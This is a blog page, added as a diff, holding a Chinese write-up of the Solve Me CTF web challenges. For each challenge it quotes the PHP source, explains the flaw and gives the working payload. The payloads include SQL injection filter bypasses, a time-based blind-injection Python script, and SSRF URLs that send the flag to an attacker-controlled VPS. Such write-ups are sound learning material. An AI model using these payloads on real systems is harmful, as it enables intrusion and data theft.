@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+
+
+
+ <html class="no-js"> 
+<head>
+    <title>Solve me平台 Web题wp  &middot; BlankのBlog </title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="content-language" content="en-us" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="Blank">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+    <meta name="generator" content="Hugo 0.37.1" />
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://blank233.github.io/css/smooth-scrollbar.css" />
+    <link rel="stylesheet" type="text/css" href="https://blank233.github.io/css/main.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
+    
+
+    <style>
+        .posts li {
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    
+    
+
+    <header>	
+	<div class="h-wrap">
+		
+		<h1 class="title"><a href="https://blank233.github.io/">BlankのBlog</a></h1>
+		
+	</div>
+</header>
+    
+    <div class="site-wrapper" id="full-wrapper">
+        <a name="top"></a>
+        <section class="single-wrap">
+            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
+                <div class="feat">
+                    <h5 class="page-date">
+                    <time datetime="" itemprop="datePublished">
+                    29 May 2018
+                   
+                    </time>
+                    </h5>
+                </div>
+                <h1 class="page-title" itemprop="name headline">Solve me平台 Web题wp</h1>
+                
+                
+                <h6>字数:1397  Topic:<a href="https://blank233.github.io/topics/web">web</a>
+                Tag:<a href="https://blank233.github.io/tags/2018-05">2018-05</a></h6>
+
+                <div class="page-body" itemprop="articleBody">
+                    
+
+<h3 id="warm-up">Warm up</h3>
+
+<p>直接解码就好了</p>
+
+<pre><code>λ php -r &quot;echo hex2bin(strrev(bin2hex(base64_decode('1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=')))); &quot;
+flag{582a0f2c7e302244b110cc461f5cb100}
+</code></pre>
+
+<h3 id="bad-compare">Bad compare</h3>
+
+<p>打开后看到源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['answer'])){
+
+        if($_GET['answer'] === 'роВхУъесЧМ'){
+            echo $flag;
+        }else{
+            echo 'Wrong answer';
+        }
+
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>直接复制粘贴不行，应该不是ascii中的可见字符，写个脚本跑一下</p>
+
+<pre><code>#coding=utf-8
+
+import requests
+import re
+import urllib
+
+url = 'http://badcompare.solveme.peng.kr/'
+rule = '===&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;\'(.+?)\'&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;'
+
+r = requests.get(url)
+result = re.findall(rule,r.content)
+result = ''.join(result)
+s = requests.get('http://badcompare.solveme.peng.kr/?answer='+urllib.quote(result))
+print s.content
+</code></pre>
+
+<p>得到flag</p>
+
+<pre><code>flag{446c7b68ad824cd9c1df87158717aa2b}
+</code></pre>
+
+<h3 id="winter-sleep">Winter sleep</h3>
+
+<p>点进去看到源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['time'])){
+
+        if(!is_numeric($_GET['time'])){
+            echo 'The time must be number.';
+
+        }else if($_GET['time'] &lt; 60 * 60 * 24 * 30 * 2){
+            echo 'This time is too short.';
+
+        }else if($_GET['time'] &gt; 60 * 60 * 24 * 30 * 3){
+            echo 'This time is too long.';
+
+        }else{
+            sleep((int)$_GET['time']);
+            echo $flag;
+        }
+
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>要求输入一个time，必须是数字，大于60 * 60 * 24 * 30 * 2（5184000），小于60 * 60 * 24 * 30 * 3（7776000），然后等待int(time)秒给出flag，直接输入数值肯定不现实，这里可以用到科学记数法，传入6e6。int(&lsquo;6e6&rsquo;)=6，等待6秒即可。</p>
+
+<pre><code>flag{2d4e9b6608efb8088abb2345ef2f7b90}
+</code></pre>
+
+<h3 id="hard-login">Hard login</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    session_start();
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['username'], $_GET['password'])){
+
+        if(isset($_SESSION['hard_login_check'])){
+            echo 'Already logged in..';
+
+        }else if(!isset($_GET['username']{3}) || strtolower($_GET['username']) != $hidden_username){
+            echo 'Wrong username..';
+
+        }else if(!isset($_GET['password']{7}) || $_GET['password'] != $hidden_password){
+            echo 'Wrong password..';
+
+        }else{
+            $_SESSION['hard_login_check'] = true;
+            echo 'Login success!';
+            header('Location: ./');
+        }
+
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>测试username=admin&amp;password=admin，返回Wrong username，说明用户名正确。</p>
+
+<p>然后尝试了爆破password，然而没爆出来=  =</p>
+
+<p>尝试访问 ./ ，发现有一个跳转，bp抓包，ctrl+r，go，素质三连，得到flag</p>
+
+<pre><code>flag{0c6c0da40b898083181495d760759e78}
+</code></pre>
+
+<h3 id="url-filtering">URL filtering</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.&quot;/lib.php&quot;;
+
+    $url = urldecode($_SERVER['REQUEST_URI']);
+    $url_query = parse_url($url, PHP_URL_QUERY);
+
+    $params = explode(&quot;&amp;&quot;, $url_query);
+    foreach($params as $param){
+
+        $idx_equal = strpos($param, &quot;=&quot;);
+        if($idx_equal === false){
+            $key = $param;
+            $value = &quot;&quot;;
+        }else{
+            $key = substr($param, 0, $idx_equal);
+            $value = substr($param, $idx_equal + 1);
+        }
+
+        if(strpos($key, &quot;do_you_want_flag&quot;) !== false || strpos($value, &quot;yes&quot;) !== false){
+            die(&quot;no hack&quot;);
+        }
+    }
+
+    if(isset($_GET['do_you_want_flag']) &amp;&amp; $_GET['do_you_want_flag'] == &quot;yes&quot;){
+        die($flag);
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>想了半天，不会。看到师傅们的wp，学到了。</p>
+
+<p>考点在于pares_url()解析漏洞，在？前添加 / 会使pares_url函数返回false，这样可以绕过前面的判断</p>
+
+<pre><code>http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes
+</code></pre>
+
+<p>得到flag</p>
+
+<pre><code>flag{dce9d958be17f0f360b8148706e87bf2}
+</code></pre>
+
+<p>官方WP</p>
+
+<pre><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes
+</code></pre>
+
+<p>通过注入，使上下获取的字符串不对称绕过</p>
+
+<h3 id="hash-collision">Hash collision</h3>
+
+<p>给出源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['foo'], $_GET['bar'])){
+
+        if(strlen($_GET['foo']) &gt; 30 || strlen($_GET['bar']) &gt; 30){
+            die('Too long');
+        }
+
+        if($_GET['foo'] === $_GET['bar']){
+            die('Same value');
+        }
+
+        if(hash('sha512', $_GET['foo']) !== hash('sha512', $_GET['bar'])){
+            die('Different hash');
+        }
+
+        echo $flag, '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>数组绕过即可</p>
+
+<pre><code>http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2
+</code></pre>
+
+<p>flag</p>
+
+<pre><code>flag{0cec577bd45696ab552fe3ab6110c35b}
+</code></pre>
+
+<h3 id="array2string">Array2String</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    $value = $_GET['value'];
+
+    $username = $_GET['username'];
+    $password = $_GET['password'];
+
+    for ($i = 0; $i &lt; count($value); ++$i) {
+        if ($_GET['username']) unset($username);
+        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);
+        else $username .= chr($value[$i]);
+
+        if ($username == '15th_HackingCamp' &amp;&amp; md5($password) == md5(file_get_contents('./secret.passwd'))) {
+            echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL;
+            echo $flag, '&lt;hr&gt;';
+        }
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>传入数组value，不能传入username，通过value拼接的方式构造username使username等于 &lsquo;15th_HackingCamp &lsquo; ，但是规定value的ascii值不能在32和127之间。想到强转和弱比较的方式绕过，写了个脚本</p>
+
+<pre><code>&lt;?php
+$str = '15th_HackingCamp';
+
+for ($j=0; $j &lt; strlen($str); $j++) { 
+	foreach (get_char() as $key =&gt; $value) {
+		if ($str[$j] == $value){
+			echo 'value[]='.$key.'&amp;';
+			break;
+		}
+	}
+}
+function get_char(){
+	$i = 0;
+	$arr = array();
+	while ($i &lt;= 40) {
+		$str = $i.&quot;e1&quot;;
+		if ($str &gt; 32 &amp;&amp; $str &lt; 127){}
+		else
+		{
+			if ((ord(chr($str))&gt;32)&amp;&amp;(ord(chr($str))&lt;127))
+			{
+				// echo &quot;str:&quot;.$str.&quot;----chr:&quot;.chr($str).&quot;\n&quot;;
+				$arr[&quot;$str&quot;] = chr($str);
+			}
+		}
+	 	$i = $i+0.1;
+	}
+	return $arr;
+}
+?&gt;
+</code></pre>
+
+<p>得到一个payload</p>
+
+<pre><code>value[]=30.5e1&amp;value[]=30.9e1&amp;value[]=37.2e1&amp;value[]=36e1&amp;value[]=35.1e1&amp;value[]=32.8e1&amp;value[]=35.3e1&amp;value[]=35.5e1&amp;value[]=36.3e1&amp;value[]=36.1e1&amp;value[]=36.6e1&amp;value[]=35.9e1&amp;value[]=32.3e1&amp;value[]=35.3e1&amp;value[]=36.5e1&amp;value[]=36.8e1&amp;password=simple_passw0rd
+</code></pre>
+
+<p><strong>password可以访问./secret.passwd得到</strong></p>
+
+<p>然后看到师傅们的脚本让我无地自容= =</p>
+
+<pre><code>&lt;?php
+	$username = '15th_HackingCamp';
+	$arr = str_split($username);
+	
+	foreach($arr as $value){
+		$value = ord($value) + 256;
+		$payload .= 'value[]=' . $value . '&amp;';
+	} 
+	echo $payload .= 'password=simple_passw0rd';
+</code></pre>
+
+<p>这里使用了PHP中的chr()特性</p>
+
+<pre><code>Note that if the number is higher than 256, it will return the number mod 256.
+For example :
+chr(321)=A because A=65(256)
+# 请注意，如果数字高于256，它将返回数字mod 256。
+</code></pre>
+
+<p>flag</p>
+
+<pre><code>flag{91b966596782c89bc6eb4daa75f459d7}
+</code></pre>
+
+<h3 id="give-me-a-link">Give me a link</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['url'])){
+        $url = $_GET['url'];
+
+        if(preg_match('/_|\s|\0/', $url)){
+            die('Not allowed character');
+        }
+
+        if(!preg_match('/^https?\:\/\/'.$_SERVER['HTTP_HOST'].'/i', $url)){
+            die('Not allowed URL');
+        }
+
+        $parse = parse_url($url);
+        if($parse['path'] !== '/plz_give_me'){
+            die('Not allowed path');
+        }
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+
+        echo 'Okay, I sent the flag.', '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>过滤了_，但是下面又要求paesr后的path为  /plz_give_me ，这就有个冲突</p>
+
+<p>查询paesr_url发现</p>
+
+<pre><code>url
+The URL to parse. Invalid characters are replaced by _.
+# 无效的字符会被替换成_
+</code></pre>
+
+<p>本题测试一下</p>
+
+<pre><code>&lt;?php
+$url = $_GET['url'];
+echo $_SERVER['HTTP_HOST'].&quot;&lt;/br&gt;&quot;;
+var_dump(parse_url($url));
+</code></pre>
+
+<p>传入一个url</p>
+
+<pre><code>?url=https://www.baidu.com:8080/t%0aest
+array(4) { [&quot;scheme&quot;]=&gt; string(5) &quot;https&quot; [&quot;host&quot;]=&gt; string(13) &quot;www.baidu.com&quot; [&quot;port&quot;]=&gt; int(8080) [&quot;path&quot;]=&gt; string(6) &quot;/t_est&quot; }
+</code></pre>
+
+<p>还有一个冲突，由于没有回显，获取flag需要  $parse[&lsquo;host&rsquo;]</p>
+
+<p>但是前面限制了必须包含  $_SERVER[&lsquo;HTTP_HOST&rsquo;]</p>
+
+<pre><code>http://login:passwd@www.baidu.com:port/path/?id=1&amp;passwd=1
+协议：层级标识符 账号：密码@域名：端口/路径？查询字符串#片段id
+</code></pre>
+
+<p>查看url构成，可以用@绕过，payload如下</p>
+
+<pre><code>?url=https://givemealink.solveme.peng.kr@ip/plz%1agive%1ame
+# ip更换为vps的ip就行了
+</code></pre>
+
+<p>得到flag</p>
+
+<pre><code>[25/May/2018:16:21:40 +0800] &quot;GET /flag{0983f9eaa0357982b2c0b4c6c037dfe3}
+</code></pre>
+
+<h3 id="give-me-a-link-2">Give me a link 2</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['url'])){
+        $url = $_GET['url'];
+
+        if(preg_match('/_|\s|\0/', $url)){
+            die('Not allowed character');
+        }
+
+        $parse = parse_url($url);
+        if(!preg_match('/^https?$/i', $parse['scheme'])){
+            die('Not allowed scheme');
+        }
+
+        if(!preg_match('/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i', $parse['host'])){
+            die('Not allowed host');
+        }
+
+        if(!preg_match('/\/plz_give_me$/', $parse['path'])){
+            die('Not allowed path');
+        }
+
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if($socket === false){
+            die('Failed to create socket');
+        }
+
+        $host = gethostbyname($parse['host']);
+        $port = is_null($parse['port']) ? 80 : $parse['port'];
+
+        if(socket_connect($socket, $host, $port) === false){
+            die('Failed to connect');
+        }
+
+        $send = &quot;HEAD /&quot;.$flag.&quot; HTTP/1.1\r\n&quot;.
+            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.
+            &quot;Connection: Close\r\n&quot;.
+            &quot;\r\n\r\n&quot;;
+        socket_write($socket, $send, strlen($send));
+
+        $recv = socket_read($socket, 1024);var_dump($recv);
+        if(!preg_match('/^HTTP\/1.1 200 OK\r\n/', $recv)){
+            die('Not allowed response');
+        }
+
+        socket_close($socket);
+
+        echo 'Okay, I sent the flag.', '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>跟上一题区别不大，只是对host加了一个处理</p>
+
+<pre><code>if(!preg_match('/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i', $parse['host'])){
+	die('Not allowed host');
+}
+</code></pre>
+
+<p>必须是127开头或者是localhost或者是纯字符串，这里只要把ip由点分十进制转化成其他格式即可，payload</p>
+
+<pre><code>?url=https://ip:8080/plz%1agive%1ame
+</code></pre>
+
+<p>vps监听8080端口，得到flag</p>
+
+<pre><code>flag{51e22d08303881dd898f916cb1956c4e}
+</code></pre>
+
+<h3 id="replace-filter">Replace filter</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    if(isset($_GET['say']) &amp;&amp; strlen($_GET['say']) &lt; 20){
+
+        $say = preg_replace('/^(.*)flag(.*)$/', '${1}&lt;!-- filtered --&gt;${2}', $_GET['say']);
+
+        if(preg_match('/give_me_the_flag/', $say)){
+            echo $flag;
+        }else{
+            echo 'What the f**k?';
+        }
+
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>正则匹配的rule为</p>
+
+<pre><code>/^(.*)flag(.*)$/
+</code></pre>
+
+<p>这样写的正则是有缺陷的，^$限制了匹配的要在同一行，. 不匹配换行，如果加入还换行就匹配失败，即加上%0a即可</p>
+
+<pre><code>http://replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag
+</code></pre>
+
+<p>附PHP常见的元字符</p>
+
+<pre><code>\ 一般用于转义字符
+^ 断言目标的开始位置(或在多行模式下是行首)
+$ 断言目标的结束位置(或在多行模式下是行尾)
+. 匹配除换行符外的任何字符(默认)
+[ 开始字符类定义
+] 结束字符类定义
+| 开始一个可选分支
+( 子组的开始标记
+) 子组的结束标记
+? 作为量词，表示 0 次或 1 次匹配。位于量词后面用于改变量词的贪婪特性。 (查阅量词)
+* 量词，0 次或多次匹配
++ 量词，1 次或多次匹配
+{ 自定义量词开始标记
+} 自定义量词结束标记
+</code></pre>
+
+<p>flag</p>
+
+<pre><code>flag{f7b4422c4570282e64560f081701ccfa}
+</code></pre>
+
+<h3 id="hell-js">Hell JS</h3>
+
+<p>把给出的jsfuck代码放到sublime里面用<strong>ctrl+shift+空格</strong>一直找，大概有个选中了近半个源代码的jsfuck代码放到控制台解一下就行了</p>
+
+<p><img src="C:UsersSu_xuanAppDataLocalTemp1527475186606.png" alt="1527475186606" /></p>
+
+<p><img src="C:UsersSu_xuanAppDataLocalTemp1527475207446.png" alt="1527475207446" /></p>
+
+<p>得到flag</p>
+
+<pre><code>flag{21df4ad3ce31af845cf9cd6a5eddbb91}
+</code></pre>
+
+<h3 id="anti-sqli">Anti Sqli</h3>
+
+<p>sql注入，直接给出了源码</p>
+
+<pre><code>&lt;?php
+    // It's 'Anti SQLi' problem of 'Solve Me'.
+    error_reporting(0);
+    require __DIR__.'/lib.php'; 
+
+    $id = $_GET['id'];
+    $pw = $_GET['pw'];
+
+    if(isset($id, $pw)){
+        preg_match(
+            '/\.|\`|&quot;|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'.
+            '=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'.
+            '0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'.
+            '[\s\xA0\'&quot;]+(as|or|and|r*like|regexp)[\s\xA0\'&quot;]+|'.
+            'union[\s\xA0]+select|[\s\xA0](where|having)|'.
+            '[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'.
+            'information_schema|procedure\s+analyse\s*/is',
+            $id.','.$pw
+        ) and die('Hack detected');
+        
+        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)
+            or die('SQL server down');
+
+        $result = mysqli_fetch_array(
+            mysqli_query(
+                $con, 
+                &quot;SELECT * FROM `antisqli` WHERE `id`='{$id}' AND `pw`=md5('{$pw}');&quot;
+            )
+        );
+        mysqli_close($con);
+
+        if(isset($result)){
+            if($result['no'] === '31337'){
+                echo $flag;
+            }else{
+                echo 'Hello, ', $result['id'];
+            }
+        }else{
+            echo 'Login failed';
+        }
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>先看过滤部分</p>
+
+<pre><code>'/\.|\`|&quot;|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'.
+</code></pre>
+
+<p>使用 <strong>| \ \ |</strong> 过滤 \ ，但这样是过滤不了的，正确的 \ 过滤方法应该是 <strong>|\ \ \ \ |</strong> ，可以使用 \ 来吃掉id的一个单引号</p>
+
+<p>再看一下注释的过滤部分</p>
+
+<pre><code>|#|--[\s\xA0]|'.
+</code></pre>
+
+<p>%23用不了了，&ndash; 的过滤，限制了%A0，及元字符，尝试不可见字符，发现%0F可以</p>
+
+<p>union select的过滤可以使用union all select绕过</p>
+
+<p>根据查询语句猜测可能有3列，no，id及pw</p>
+
+<p>测试payload</p>
+
+<pre><code>http://antisqli.thinkout.rf.gd/?id=\&amp;pw=union%20all%20select%201,2,3%20from%20antisqli%20--%0F
+</code></pre>
+
+<p>返回2，id是2，猜测1是no，更改payload</p>
+
+<pre><code>http://antisqli.thinkout.rf.gd/?id=\&amp;pw=union%20all%20select%2031337,2,3%20from%20antisqli%20--%0F
+</code></pre>
+
+<p>得到flag</p>
+
+<pre><code>flag{5a0841c4738a69af352a06d282bece78}
+</code></pre>
+
+<h3 id="name-check">Name Check</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php'; 
+
+    if(isset($_GET['name'])){
+
+        $name = $_GET['name'];
+        if(preg_match(&quot;/admin|--|;|\(\)|\/\*|\\0/i&quot;, $name)){
+            echo 'Not allowed input';
+            goto quit;
+        }
+
+        $sql = new SQLite3('name_check.db', SQLITE3_OPEN_READWRITE);
+        $res = $sql-&gt;query(&quot;
+            SELECT 
+            MAX('0','1','{$name}') LIKE 'a%', 
+            INSTR('{$name}','d')&gt;0, 
+            MIN('{$name}','b','c') LIKE '__m__', 
+            SUBSTR('{$name}',-2)='in'
+        ;&quot;);
+        if($res === false){
+            echo 'Database error';
+            goto quit;
+        }
+
+        $row = $res-&gt;fetchArray(SQLITE3_NUM);
+        if(
+            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||
+            array_sum($row) !== 4 
+        ){
+            echo 'Auth failed';
+            goto quit;
+        }
+
+        echo $flag;
+
+    quit:
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>看看获取flag的要求</p>
+
+<pre><code>$row[0] + $row[1] + $row[2] + $row[3] !== 4 ||
+array_sum($row) !== 4 
+</code></pre>
+
+<p>就是说前面的四个语句执行结果都为true，看看语句</p>
+
+<pre><code>MAX('0','1','{$name}') LIKE 'a%', 
+INSTR('{$name}','d')&gt;0, 
+MIN('{$name}','b','c') LIKE '__m__', 
+SUBSTR('{$name}',-2)='in'
+</code></pre>
+
+<p>第一条，输入的name必须以a开头</p>
+
+<p>第二条，输入的name必须包含d</p>
+
+<p>第三条，name长度为5，中间是m</p>
+
+<p>第四条，name必须以in结尾</p>
+
+<p>这不就是admin么，，但是前面又过滤了admin，百度发现sqlite字符串连接使用 || ，前面的过滤并没有过滤 ||，构造payload</p>
+
+<pre><code>http://namecheck.solveme.peng.kr/?name=a%27||%27dmin
+</code></pre>
+
+<p>得到flag</p>
+
+<pre><code>flag{623870cc3336cf126a8345697464aadc}
+</code></pre>
+
+<h3 id="i-am-slowly">I am slowly</h3>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+    // It's 'I am slowly' problem of 'Solve Me'.
+    error_reporting(0);
+    require __DIR__.'/lib.php'; 
+
+    $table = 'iamslowly_'.ip2long($_SERVER['REMOTE_ADDR']);
+    $answer = $_GET['answer'];
+
+    if(isset($answer)){
+        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)
+            or die('SQL server down');
+
+        $result = mysqli_fetch_array(
+            mysqli_query($con, &quot;SELECT `count` FROM `{$table}`;&quot;)
+        );
+        if(!isset($result)){
+            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS `{$table}` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;);
+            $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand()));
+            mysqli_query($con, &quot;INSERT INTO `{$table}` (`answer`,`count`) VALUES ('{$new_answer}',1);&quot;);
+
+        }elseif($result['count'] === '12'){
+            mysqli_query($con, &quot;DROP TABLE `{$table}`;&quot;);
+            echo 'Game over';
+            goto quit;
+        }
+
+        $randtime = mt_rand(1, 10);
+        $result = mysqli_fetch_array(
+            mysqli_query($con, &quot;SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';&quot;)
+        );
+        if(isset($result) &amp;&amp; $result['answer'] === $answer){
+            mysqli_query($con, &quot;DROP TABLE `{$table}`;&quot;);
+            echo $flag;
+        }else{
+            mysqli_query($con, &quot;UPDATE `{$table}` SET `count`=`count`+1;&quot;);
+            echo 'Go fast';
+        }
+
+quit:
+        mysqli_close($con);
+        echo '&lt;hr&gt;';
+    }
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>审计一番，可以找到注入点</p>
+
+<pre><code>mysqli_query($con, &quot;SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';&quot;)
+</code></pre>
+
+<p>但是题目有个做了限制，每次执行sql语句会执行一次 count+1，当count等于12时游戏结束。</p>
+
+<p>但是有个逻辑上的错误就是，先查询count值，再执行sql语句，然后再进行 count+1，所以我们可以在count值为11的时候设置一个sleep，睡眠时间可以长一点，然后在发送一个不带sleep的sql语句，后发送的请求肯定先完成，这时候count为12，然后等待第一个语句执行结束，此时count为13，这时就已经绕过前面的限制，就可以开始盲注了。</p>
+
+<p>&hellip;</p>
+
+<p>&hellip;</p>
+
+<p>经过N久的测试，不知道哪没弄好，总是绕不过去12的限制，于是，，我放弃了，233333</p>
+
+<p>贴个脚本，有兴趣的自己测测</p>
+
+<pre><code>import requests
+
+header = {
+&quot;Cookie&quot;:&quot;__test=de2f0bea16438ccba78ff6517df65489&quot;
+}
+flag = &quot;&quot;
+for i in range(1,2):
+	# times = 0
+	for j in &quot;abcdef1234567890&quot;:
+	    url = &quot;http://iamslowly.thinkout.rf.gd/?answer=' or if((answer like '%s%%'),sleep(30),1)%%23&quot;%(flag+j)
+	    try:
+	    	# times += 1
+	        r = requests.get(url=url,headers=header,timeout=29)
+	        print &quot;i:&quot;,i,&quot;j:&quot;,j,r.content[:10],&quot;flag&quot;,flag
+	        if r.content[:4] == 'Game':
+	        	break
+	    except:
+	        flag += j
+	        print flag
+	        break
+	        # continue
+	    # if times == 11:
+	    # 	break
+
+</code></pre>
+
+<h3 id="check-via-eval">Check via eval</h3>
+
+<p>源代码</p>
+
+<pre><code>
+&lt;?php
+    error_reporting(0);
+    require __DIR__.'/lib.php';
+
+    $exam = 'return\''.sha1(time()).'\';';
+
+    if (!isset($_GET['flag'])) {
+        echo '&lt;a href=&quot;./?flag='.$exam.'&quot;&gt;Click here&lt;/a&gt;';
+    }
+    else if (strlen($_GET['flag']) != strlen($exam)) {
+        echo 'Not allowed length';
+    }
+    else if (preg_match('/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
+        echo 'Not allowed keyword';
+    }
+    else if (eval($_GET['flag']) === sha1($flag)) {
+        echo $flag;
+    }
+    else {
+        echo 'What\'s going on?';
+    }
+
+    echo '&lt;hr&gt;';
+
+    highlight_file(__FILE__);
+</code></pre>
+
+<p>先看获得flag的条件</p>
+
+<pre><code>eval($_GET['flag']) === sha1($flag)
+</code></pre>
+
+<p>两种思路，一是执行shal($flag)，但是()被过滤了，那就只能是第二种方法了，直接输出flag，过滤了echo、print、require等，反正就是常规的函数没法输出了，，那就找找不常见的，先看看eval函数</p>
+
+<pre><code>需要被执行的字符串
+
+代码不能包含打开/关闭 PHP tags。比如， *'echo &quot;Hi!&quot;;'* 不能这样传入： *'&lt;?php echo &quot;Hi!&quot;; ?&gt;'*。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 *'echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;'*。
+
+除此之外，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 *'echo &quot;Hi!&quot;'* 会导致一个 parse error，而 *'echo &quot;Hi!&quot;;'* 则会正常运行。
+
+*return* 语句会立即中止当前字符串的执行。
+
+代码执行的作用域是调用 **eval()** 处的作用域。因此，**eval()** 里任何的变量定义、修改，都会在函数结束后被保留。
+</code></pre>
+
+<p>然后查到echo有一个特殊用法</p>
+
+<pre><code>**echo** 也有一个快捷用法，你可以在打开标记前直接用一个等号。在 PHP 5.4.0 之前，必须在php.ini 里面启用 short_open_tag才有效。 
+</code></pre>
+
+<p>看看例子</p>
+
+<pre><code>&lt;?php
+$str = 'Hello, world!';
+//下面两种输出方式，后者是前者的快捷用法
+?&gt;
+&lt;?php echo $str?&gt;
+&lt;?=$str?&gt;
+</code></pre>
+
+<p>通过echo的快捷用法来输出$flag，使用拼接替换的方式构造</p>
+
+<pre><code>$a='flaa';$a{3}='g';&lt;?=${$a}?&gt;;
+</code></pre>
+
+<p>payload</p>
+
+<pre><code>$a='flaa';$a{3}='g';11111111111111;?&gt;&lt;?=${$a}?&gt;&lt;?
+</code></pre>
+
+<p>flag</p>
+
+<pre><code>flag{47d07abef31b3adb4a4107bd2b2b3d7e}
+</code></pre>
+                    
+                </div>
+                <h6>千帆过尽，勿忘初心 <a href="#top"> UP </a></h6>
+                <div class="feat share">
+                </div>
+
+                
+            </article>
+        </section>
+        <footer>
+	
+</footer>
+
+    </div>
+
+    <div class="next-prev-arrows">
+        
+        
+            <a rel="prev" href="https://blank233.github.io/2018/05/20/hitcon-2017-babyfirst-revenge/" id="prev">
+                 <span class="nav-title nav-title-prev">HITCON 2017 babyfirst-revenge</span> &rarr;
+            </a>
+        
+    </div>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://blank233.github.io/js/scrollreveal.min.js"></script>
+<script type='application/javascript' src='https://blank233.github.io/js/smooth-scrollbar.js'></script>
+<script src="https://blank233.github.io/js/baffle.min.js"></script>
+<script src="https://blank233.github.io/js/main.js"></script>
+
+
+
+
+
+
+<!-- Syntax highlighting -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+    <script src="https://blank233.github.io/js/chick.js"></script>
+</body>
+</html>
